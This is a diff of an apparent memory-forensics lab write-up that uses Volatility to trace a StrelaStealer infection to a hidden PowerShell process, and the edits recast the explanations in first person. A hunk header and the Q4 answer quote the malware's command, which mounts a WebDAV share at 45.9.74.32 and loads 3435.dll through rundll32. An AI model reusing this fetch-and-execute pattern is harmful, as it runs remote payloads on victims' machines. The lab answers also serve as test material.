@@ -37,7 +37,7 @@ The output identified the system as Windows 10, showed the NT root as `C:\Window
 
 ### Q1: What is the malicious process?
 
-The `windows.malfind` plugin highlights memory regions that may contain injected or suspicious executable code. Its output points to a PowerShell process with PID `3692`, and the later command-line evidence shows that this process ran a hidden network command. Together, these details identify `powershell.exe` as the malicious process.
+I used the command `python vol.py -f <path_to_memory_dump> windows.malfind` to search the memory image for suspicious executable regions. The output pointed to a PowerShell process with PID `3692`, and its later command-line evidence showed hidden network activity. This identified `powershell.exe` as the malicious process.
 
 **Answer:** `powershell.exe`
 
@@ -49,7 +49,7 @@ python vol.py -f <path_to_memory_dump> windows.malfind
 
 ### Q2: What is the parent PID of the malicious process?
 
-The `windows.pstree` plugin organizes processes by their parent-child relationships. In the output, the suspicious PowerShell process with PID `3692` is linked to PID `4210` as its parent. Even if the parent process had already ended, the relationship remained available in the captured memory.
+I used `python vol.py -f <path_to_memory_dump> windows.pstree | grep "3692"` to display the process relationship for the suspicious PowerShell PID. The output showed PID `3692` connected to parent PID `4210`. Even though the parent may have ended before the capture, the memory evidence still showed that relationship.
 
 **Answer:** `4210`
 
@@ -63,7 +63,7 @@ python vol.py -f <path_to_memory_dump> windows.pstree | grep "3692"
 
 ### Q3: What filename was used for the second-stage payload?
 
-The PowerShell command uses `rundll32` to load a DLL from a remote path. In the command, the final file component before the exported function name `entry` is `3435.dll`. This identifies the filename used for the second-stage payload.
+I used `python vol.py -f <path_to_memory_dump> windows.cmdline | grep "3692"` to display the full command line for the malicious PowerShell process. The result showed `rundll32` loading a remote path ending in `3435.dll,entry`. The filename before the exported `entry` function identified `3435.dll` as the second-stage payload.
 
 **Answer:** `3435.dll`
 
@@ -75,7 +75,7 @@ powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundl
 
 ### Q4: What shared directory was accessed on the remote server?
 
-The remote location follows a UNC-style WebDAV path. After the server address and port, the path contains `davwwwroot` before the DLL filename. That section of the path is the shared directory accessed on the remote server.
+I used the same `windows.cmdline` command to examine the remote path used by PowerShell. The path was `\\45.9.74.32@8888\davwwwroot\3435.dll`, with `davwwwroot` placed between the server address and the DLL filename. This showed that `davwwwroot` was the shared directory accessed on the remote server.
 
 **Answer:** `davwwwroot`
 
@@ -83,13 +83,13 @@ The remote location follows a UNC-style WebDAV path. After the server address an
 
 ### Q5: What MITRE ATT&CK sub-technique matches this execution method?
 
-The command does not launch the malicious DLL directly. Instead, it uses the trusted Windows utility `rundll32.exe` to load the remote DLL and call its `entry` function. MITRE ATT&CK classifies this abuse of Rundll32 under Signed Binary Proxy Execution, sub-technique `T1218.011`.
+I used the MITRE ATT&CK framework to compare the command-line behavior with known execution techniques. The command used the trusted Windows utility `rundll32.exe` to load a malicious DLL and call its `entry` function instead of launching the payload directly. MITRE ATT&CK maps this behavior to Signed Binary Proxy Execution: Rundll32, sub-technique `T1218.011`.
 
 **Answer:** `T1218.011` - Signed Binary Proxy Execution: Rundll32
 
 ### Q6: Which username ran the malicious process?
 
-The `windows.getsids.GetSIDs` plugin displays the security identifiers associated with a process. The results for PID `3692` map the process to the user account named `Elon`. They also show administrator membership and a high integrity level, meaning the malicious process was running with elevated access.
+I used `python vol.py -f <path_to_memory_dump> windows.getsids.GetSIDs | grep "3692"` to display the security identifiers attached to the malicious process. The results mapped PID `3692` to the user account `Elon` and also showed administrator membership and a high integrity level. This confirmed that the process ran under the username Elon with elevated access.
 
 **Answer:** `Elon`
 
@@ -101,7 +101,7 @@ python vol.py -f <path_to_memory_dump> windows.getsids.GetSIDs | grep "3692"
 
 ### Q7: What is the malware family?
 
-The PowerShell command provides the remote IP address `45.9.74.32`, which can be used as a threat intelligence pivot. VirusTotal relations connect this address to suspicious DLL files and reporting associated with an infostealer that targets email credentials. Those related indicators identify the malware family as StrelaStealer.
+I used the remote IP address `45.9.74.32` from the PowerShell command as a search indicator in VirusTotal. The Relations section connected the address to suspicious DLL files and threat reporting about an infostealer that targets email credentials. Those related indicators identified the malware family as StrelaStealer.
 
 **Answer:** `StrelaStealer`
 
